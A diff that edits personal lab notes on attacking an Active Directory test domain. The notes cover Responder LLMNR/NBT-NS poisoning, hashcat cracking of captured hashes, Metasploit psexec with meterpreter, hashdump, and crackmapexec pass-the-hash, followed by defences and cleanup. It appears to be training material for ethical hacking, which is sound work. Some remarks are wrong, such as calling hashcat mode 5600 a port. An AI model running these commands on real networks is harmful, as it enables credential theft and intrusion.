@@ -10,15 +10,15 @@ Download it
 #Evaluation for an 180days
 Click on ISO for the "evaluation file type"
 Click on "continue"
-Enter your bio data
+Create your profile (bio data)
 Click on "Continue"
-It will automatically downlaod the ISO
+It will automatically download the ISO
 
 #Do same for Windows 10 Enterprise
 Select "ISO Enterprise" for the "evaluation file type"
 Click on "Continue" and download it.
 
-#Running 3 VMs at once for this lab
+#3 VMs will be used for this lab
 #you have to have a super fast computer
 
 Once you set up the vm
@@ -41,7 +41,7 @@ https://cloudinfrastructureservices.co.uk/setup-a-domain-controller-on-windows-s
 From the "Server Manager" home page, select "Add roles and features"
 Click "Next" on before you begin page
 Click "Next" on "Select Installation Type" page- "Role based or feature based installation"
-Select "destination server" from the pool and click on "Next"
+Select "Destination server" from the pool and click on "Next"
 Select "Server roles" "Active Directory Domain services"- check the box for it
 Select "Add Features"
 Click "Next"
@@ -49,7 +49,7 @@ Click "Next"
 Click "Next"
 Click "Install" (takes some minutes)
 Once it shows "Installed", click on "Close"
-#Need dc when we turn on ad service
+#Need the dc when the ad service is turned on, so lets set it up.
 Hit the top warning sign saying "promote this server to a domain controller"
 From the deployment configuration, select "Add a new forest"
 Give it a "Root domain name"
@@ -68,12 +68,12 @@ Select "Domain Controllers" to see what it is probably
 There is "Users" folder, you can click on it to view too
 Right click on the "Users"
 Click "New"
-Enter the details
+Enter all the necessary details
 Click "Next"
-Set passwords
-#So for any user(laptop or whatever), you will always be joining the domain
+Set your passwords
+#So for any user(laptop or whatever), you will always be joining the domain (users in your organization for onboarding and others)
 
-#All about enumeration and exploitation
+#All about enumeration and exploitation (carrying out your ethical hacking on it)
 Go to your "Server Manager"
 Select "File Storage and Services"
 Select "Shares" below "Servers"
@@ -85,7 +85,7 @@ Go back to the Server Manager and on the page where you have selected "Share", s
 Select "New Share"
 Select "SMB Share Quick" if it is not yet automatically selected
 Enter the appropriate path to "Type a custom path" under "Select the server and path for this share" or "Browse"
-Select the approrpiate folder e.g "hackme" folder in this case
+Select the appropiate folder e.g "hackme" folder in this case
 Select "Next"
 Select "Next"
 Check the box for "Enable access based enumeration" and "Allow caching of share"
@@ -104,24 +104,24 @@ Select "Map a network drive"
 Give the drive a name in the "Folder" column e.g \\JIDE\hackme
 Check the box for "Recoonect sign in"
 Click "Finish"
-You will have access to hackme folder
+You will have access to hackme folder now
 
 #LINK LOCAL MULTICAST NAME RESOLUTION/ NETBIOS NAME SERVICE (NBTMS)
 #Used to identify host when DNS fails
 #Downside: using username and hash
 #ATTACK- Classic man in the middle attack
-#targeting getting hashes from a network- some hashes that don't have specified destinations
+#Targeting getting hashes from a network- some hashes that don't have specified destinations
 #waiting to pounce as an hacker when an authenticated and authorized user sends his hash to you based on what you have configured.
-#Hacker takes the hash and tries to run it against the password. If the password is not too long, you may have a field day.
+#Hacker takes the hash and tries to run it against the password. If the password is not too long, you may have a field day(success)
 #Or do a prelaying with the hash- try to send it to a server
-#then use the hash to authenticate to a server via SMB without knowing the passwod of the server
+#Then use the hash to authenticate to a server via SMB without knowing the passwod of the server
 
 #TODO
-#Set up a man in the middle listener called responder
+#Set up a man in the middle listener called responder(open source python script tool)
 locate your responder on kali- locate Responder.py #should be in user share responder folder
 cd into the path - cd /usr/share/responder/ #you are setting this up to get access to a particular server. maybe you have remote access
-#already, by you are just sitting in there on the network and waiting to get an elevated access e.g through a misdirected hash
-#best time to run this- in the morning, when people just resume at work at trying to access their workstations
+#already, but you are just sitting in there on the network and waiting to get an elevated access e.g through a misdirected hash
+#best time to run this- in the morning, when people just resume at work and trying to access their workstations
 run - python Responder.py -I eth0 -rdw # i for interface, switches of r,d and w
 #It will show you the poisoners- LLMNR, NBT -NS, DNS/MONS
 #The available servers- some maybe on, while others are off
@@ -129,16 +129,15 @@ run - python Responder.py -I eth0 -rdw # i for interface, switches of r,d and w
 #Poisoning options
 #Generic Options
 
-#We are listening to events and hash etc
-#To trigger or check if it is working, try to connect to your lab pc and open the smb folder created(hackme)
-#the responder will send something to the PC
-#YOU CAN GRAB YOUR IP THROUGH ifconfig and open up a browser to run it there- it should trigger a hash for the responder that
-#has been set up
+#From here, you can listen to events and hash etc
+#To trigger or check if it is working, connect to your lab pc and open the smb folder created(hackme)
+#The responder will send something to the PC
+#GRAB YOUR IP using ifconfig and open up a browser to run it there- it should trigger a hash for the responder that has been set up.
 
-#rockyou.txt /usr/share/wordlists/rockyou.txt.gz - locate it in that folder
-#It is a file that has a massive password list. It is inbuil in kali by default
-#unzip it from where it is located and use "hashcat" e.g run the below
-hashcat -m 5600 hash.txt /root/rockyou.txt  #the m means mode, 5600 is the port we are using, /root/rockyou.txt path to where the wordlist is
+#you can use this - "rockyou.txt /usr/share/wordlists/rockyou.txt.gz" for the lab - locate it in that folder 
+#It is a file that has a massive password list. It is inbuilt in kali by default
+#Unzip it from where it is located and use "hashcat" e.g run the below
+hashcat -m 5600 hash.txt /root/rockyou.txt  #the m means mode, 5600 is the port to be used, /root/rockyou.txt path to where the wordlist is
 #Output
                                                                              
 ┌──(kali㉿kali)-[~/Downloads]
@@ -147,11 +146,11 @@ hashcat -m 5600 hash.txt /root/rockyou.txt  #the m means mode, 5600 is the port 
                                                                              
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ 
-#go to whatever machine you are running on and cd into the folder that has the hashcat file
+#go to whatever machine you are running on and cd into the folder that has the hashcat file, for me, i naviagte to where it is for me
 #cd c:\Users\Olajide\Desktop\hashcat-4.2.1
 #run "hashcat64.exe" -m 5600 hashes.txt rockyou.txt
-#Once you run that, it will display a password that has been cracked on not. You can use this to navigate the network- have access
-#realuniq is another wordlist that you can use.
+#Once you run that, it will display a password that has been cracked or not. You can use this to exploit the network- have access
+#realuniq is another "wordlist" that you can use.
 
 #Defense Strategy
 The best defense for this is to disable  LLMNR and NBT-NS
@@ -171,9 +170,10 @@ WINS Tab
 Select "Disable NETBIOS over TCP/IP"
 
 #IF YOU CANNOT DISABLE LLMNR/NBT-NS, the best course of action is
-1. Require Network Access Control. If an attacker cannot get onto the network, the attack cannot be performed
+1. Require Network Access Control. If an attacker cannot get onto the network, the attack cannot be performed. firewalls, ipsec
 2. Require strong user passwords e.g > 12 characters in length and limit common usage. The more complex a password,the harder
 it is for an attacker to crack the hash. Greater to crack anything more than 12.
+3. MFA
 
 #TODO- MS17-010 FOR ETERNAL BLUE
 
@@ -215,7 +215,7 @@ Go to "Machines" in the navigation pane your left
 Select "Retired"
 
 #Go to a Windows machine. Simulating for an attack
-#Go to C:drive where you have a folder that has users credentials or something thqt can give qaccess e.g Scan
+#Go to C:drive where you have a folder that has users credentials or something that can give access e.g Scan
 Right click on the folder and select "Properties"
 Select "Sharing"
 Select "Share"
@@ -243,7 +243,7 @@ Turn the firewall off
 Get the ip of the machine by running ifconfig
 Go to kali terminal to use metasploit
 run "msfconsole"
-#use exex- run
+#use exec- run
 use exploit/windows/smb/psexec
 #gameplan- as an administrator you can share files, the shell can be gained and malware will be uploaded to attack
 # apt install crackmapexec
@@ -252,7 +252,7 @@ use exploit/windows/smb/psexec
 options
 st rhosts $ip
 set smbdomain $admin user
-set smbpass Password1
+set smbpass #########
 set smbuser jefunkunle
 show targets - #to see what targets that we have
 #shows targets as Automatic, Powershell, Native upload, MOF upload. Powershell is always a PITA. Native Upload is good(2). run the below:
@@ -272,7 +272,7 @@ getuid
 
 set payload windows/meterpreter/
 sessions
-#run the seesion that is indicated e.g it could be 1
+#run the session that is indicated e.g it could be 1
 sessions 1
 #it will switch from a metasploit to meterpreter
 ps
@@ -311,7 +311,7 @@ ps
 migrate 1076 #this could break your machine and reboot it - when you need to migrate from 32 arch to 64 (it is like switching to another seesion)
 sysinfo #to see what arch you are on now.
 hashdump
-#take one of the hashes-copy it from the as, and go and paste it in the crackmapexec command that you have in kali terminal
+#take one of the hashes-copy it from the hash, and go and paste it in the crackmapexec command that you have in kali terminal
 crackmapexec smb $ip/24 -u Administrator -p 'paste the hash here'
 crackmapexec smb $ip/24 -u Administrator -H 'paste the hash here'
 
@@ -437,7 +437,7 @@ run
 #Cleanup (Pentesting Cleanup)
 1. Remove all executables, scripts, and temporary file from a compromised system. If possible use secure delete method to remove files and folders
 2. Return to original values system settings and app configuration parameters if they were modified during assessment.
-3. Remove all backdoors and/or rootkits isntalled
+3. Remove all backdoors and/or rootkits installed
 4. Remove any user accounts created for connecting back to compromise systems.
 http://www.pentest-standard.org/index.php/Post_Exploitation#Cleanup
 
